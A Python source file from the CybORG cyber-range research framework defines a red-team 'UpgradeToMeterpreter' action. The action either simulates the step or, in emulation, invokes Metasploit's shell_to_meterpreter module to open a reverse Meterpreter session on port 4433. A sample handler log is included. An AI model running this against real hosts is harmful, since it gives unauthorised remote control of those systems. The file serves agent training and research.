# Copyright DST Group. Licensed under the MIT license.
import string
from ipaddress import IPv4Address
import random
import re

from CybORG.Shared.Actions.MSFActionsFolder.MSFAction import MSFAction, lo

# Upgrade a MSF_SHELL session to a METERPRETER session
from CybORG.Shared.Enums import SessionType, AppProtocol
from CybORG.Shared.Observation import Observation


class UpgradeToMeterpreter(MSFAction):
    def __init__(self, session: int, agent: str, ip_address: IPv4Address):
        super().__init__(session=session, agent=agent)
        self.ip_address = ip_address

    def sim_execute(self, state):
        obs = Observation()
        obs.set_success(False)
        # TODO: Sort ip_address to session handling

        server_sessions = [ s for s in state.sessions['Red'] if s.ident == self.session]
        if self.session not in [ s.ident for s in server_sessions if s.session_type == SessionType.MSF_SERVER and s.active]:
            # invalid server session
            obs.set_success(False)
            return obs

        # choose first server session
        server_session = server_sessions[0]
        from_host = server_session.host

        # find_session_by_ip_addr
        target_sessions = [ s for s in state.sessions[self.agent] if s.host == state.ip_addresses[self.ip_address]]
        # identify suitable suitable
        suitable_sessions = []
        for qual_session in target_sessions: 

          # action fails if there is not suitable session (ie not active or of the correct type)
          if (qual_session.session_type == SessionType.MSF_SHELL or qual_session.session_type == SessionType.METERPRETER) and qual_session.active:
            suitable_sessions.append(qual_session)

        # no suitable sessions
        if len(suitable_sessions) == 0:
            return obs

        # choose first target session.  may need to be probablistic if more than 1 qualifying session
        session_to_upgrade = suitable_sessions[0]

        # find shared subnet of the two hosts
        server_interface = None
        up_interface = None
        # test if the two sessions are on the same host
        if server_session.host == session_to_upgrade.host:
            server_interface = server_session.host.get_interface(interface_name='lo')
        else:
            for upgrade_interface in state.hosts[session_to_upgrade.host].interfaces:
                if upgrade_interface.ip_address != lo:
                    server_session, server_interface = self.get_local_source_interface(local_session=server_session,
                                                                                       remote_address=upgrade_interface.ip_address,
                                                                                       state=state)
                if server_interface is not None:
                    up_interface = upgrade_interface
                    break

        if server_interface is None:
            return obs

        server_address = server_interface.ip_address
        upgrade_address = up_interface.ip_address

        obs.set_success(True)

        # create new process on target host
        # Randomly generate name:
        process_name = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase) for _ in range(5))
        hostname = state.ip_addresses[self.ip_address]
        target_host = state.hosts[hostname]

        target_process = target_host.add_process(name=process_name, path="/tmp", user=session_to_upgrade.username, ppid=session_to_upgrade.pid)

        local_port = state.hosts[hostname].get_ephemeral_port()
        new_session = state.add_session(host=target_host.hostname, agent=self.agent,
                                        user=session_to_upgrade.username, session_type="meterpreter",
                                        parent=server_session, process=target_process.pid)

        new_connection = {"Application Protocol": AppProtocol.TCP,
                          "remote_address": server_address,
                          "remote_port": 4433,
                          "local_address": str(self.ip_address),
                          "local_port": local_port}
        target_process.connections.append(new_connection)

        remote_port = {"local_port": 4433,
                       "Application Protocol": AppProtocol.TCP,
                       "local_address": server_address,
                       "remote_address": str(self.ip_address),
                       "remote_port": local_port
                       }

        # update process on server host
        state.hosts[server_session.host].get_process(server_session.pid).connections.append(remote_port)

        obs.add_session_info(hostid=hostname, session_id=new_session.ident,
                             session_type=new_session.session_type, agent=self.agent, username=target_process.user)

        # disable server side process observation for now
        #obs.add_process(hostid=server_session.host, local_address=server_address, local_port=4433,
        #                remote_address=str(self.ip_address),
        #                remote_port=local_port)
        obs.add_process(hostid=hostname, local_address=str(self.ip_address), local_port=local_port,
                        remote_address=server_address,
                        remote_port=4433)
        return obs

    def emu_execute(self, session_handler) -> Observation:
        obs = Observation()
        from CybORG.Emulator.Session import MSFSessionHandler
        if type(session_handler) is not MSFSessionHandler:
            obs.set_success(False)
            return obs

        target_sessions = session_handler.get_session_by_remote_ip(str(self.ip_address), session_type="shell")
        if len(target_sessions) == 0:
           obs.set_success(False)
           return obs
        session_id = list(target_sessions.keys())[0]
        print(target_sessions[session_id])
        # need to identify the LHOST from the session
        ltunnel = target_sessions[session_id]["tunnel_local"]
        tunnel_conn = re.match("(.*):(.*)",ltunnel)
        print(tunnel_conn)
        tunnel = re.match("(.*)-(.*)",tunnel_conn[1])
        print(tunnel)
        if tunnel:
            lhost = tunnel[1]
        else:
            lhost = tunnel_conn[1]
        print(lhost)
        output = session_handler.execute_module(mtype='post', mname='multi/manage/shell_to_meterpreter',
                opts={'SESSION': session_id, 'LHOST': lhost, "verbose": "true"})
        obs.add_raw_obs(output)
        obs.set_success(False)
        session = None
        for line in output.split('\n'):
            if '[*] Meterpreter session' in line:
                obs.set_success(True)
                split = line.split(' ')
                # print(list(enumerate(split)))
                session = int(split[3])
                remote_address, remote_port = split[5][1:].split(':')
                # no need to identify local_address. this should be the self.ip_address
                # local_address could be the NAT gateway
                local_address, local_port = split[7][:-1].split(':')
                # date = datetime.fromisoformat(split[10] + ' ' + split[11])
                obs.add_process(hostid=str(self.ip_address), local_port=local_port, remote_port=remote_port,
                                local_address=local_address, remote_address=remote_address)
                obs.add_process(hostid=str(remote_address), remote_port=local_port, local_port=remote_port,
                                remote_address=local_address, local_address=remote_address)

                # print(f'session: {session}')
                # print(f'local_port: {local_port}')
                # print(f'local_address: {local_address}')
                # print(f'remote_port: {remote_port}')
                # print(f'remote_address: {remote_address}')
                # print(f'date: {date}')
        '''Example obs
        [*] Upgrading session ID: 1
        [*] Starting exploit/multi/handler
        [*] Started reverse TCP handler on 10.0.20.245:4433 
        [*] Sending stage (985320 bytes) to 10.0.2.164
        [*] Meterpreter session 2 opened (10.0.20.245:4433 -> 10.0.2.164:38182) at 2020-08-03 06:10:00 +0000
        [*] Command stager progress: 100.00% (773/773 bytes)
        [*] Post module execution completed'''
        if session == None:
            obs = Observation()
            return obs
        # get user id of session
        print("get user from session")
        user = session_handler.get_session_user(session)
        print(user)
        if user is None:
          obs = Observation()
          obs.set_success(False)
        else:
          obs.add_session_info(hostid=str(self.ip_address), username=user, session_id=session, session_type='meterpreter', agent=self.agent)
        return obs

    def __str__(self):
        return super(UpgradeToMeterpreter, self).__str__() + f", Hostname: {self.ip_address}"
